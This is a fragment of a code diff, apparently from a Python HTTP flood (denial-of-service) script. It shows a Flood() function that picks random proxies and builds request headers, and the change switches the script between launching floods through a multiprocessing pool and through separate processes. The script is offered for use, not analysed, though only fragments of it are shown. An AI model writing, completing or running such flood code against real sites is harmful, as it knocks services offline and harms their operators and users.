@@ -100,8 +100,8 @@ def checkProxies():
 
 time.sleep(1)
 
-# Xoa darkdarkbruhbruhlmaolmao neu muon dung Process Class
-def Flood(darkdarkbruhbruhlmaolmao):
+# Them darkdarkbruhbruhlmaolmao neu muon dung Pool Class
+def Flood():
     proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
     Accept = rC(AcceptHeaders)
@@ -151,7 +151,7 @@ for indexPicker in range(threadNumber):
     process.start()
 for process in processList:
     process.join()"""
-darkdarkbruhbruhlmaolmao = multiprocessing.Pool(processes=threadNumber)
-darkdarkbruhbruhlmaolmao.map(Flood, range(500))
-"""while True:
-    input()"""
+#darkdarkbruhbruhlmaolmao = multiprocessing.Pool(processes=threadNumber)
+#darkdarkbruhbruhlmaolmao.map(Flood, range(500))
+while True:
+    input()
